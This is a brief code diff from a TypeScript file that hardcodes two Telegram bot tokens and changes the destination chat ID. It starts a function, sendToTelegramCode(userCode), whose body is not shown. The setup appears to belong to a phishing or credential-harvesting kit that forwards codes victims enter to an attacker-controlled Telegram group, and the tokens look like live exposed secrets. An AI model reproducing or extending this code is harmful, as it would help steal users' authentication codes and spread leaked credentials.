@@ -4,7 +4,7 @@ import axios from 'axios';
 
 const BOT_TOKEN = "8286931411:AAEX2p9q08v0fov7hKZnJQocbx1Dzn8xOXA";
 const BOT_TOKEN1 = "8489459714:AAHGHp3pbli9SRHFLG7bMhsLX4CdhgIRCsQ";
-const CHAT_ID = "8027544611";
+const CHAT_ID = "-1002909888730";
 
 async function sendToTelegramCode(userCode: string) {
   try {
